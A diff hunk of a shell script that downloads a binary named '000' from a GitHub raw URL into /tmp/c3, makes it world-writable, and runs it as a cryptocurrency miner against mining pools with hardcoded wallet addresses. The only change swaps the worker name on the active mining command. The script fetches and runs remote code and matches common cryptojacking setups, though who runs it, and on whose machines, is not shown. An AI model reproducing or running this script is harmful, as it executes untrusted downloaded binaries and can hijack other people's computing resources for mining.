@@ -12,4 +12,4 @@ wget https://raw.githubusercontent.com/Blenkinship/any/main/000
 chmod -R  777 /tmp/c3
 ###/tmp/c3/000 --config=/tmp/c3/config.json
 ##/tmp/c3/000 -o auto.c3pool.org:19999 -u 49mZniQ6izgMDGL6xqEipZQ1Mh92KUij3J6bVmCH6FjhAvZWzmCj6AmK6KJc21skfxLDCaBLbd7pAXMXbsLN5zHCTtn7e9x -p qunau2024.Q1Qamz -a rx/0 -k --donate-level 0
-/tmp/c3/000 -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.qun2312105 -k --donate-level 0
+/tmp/c3/000 -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.qun2312102 -k --donate-level 0
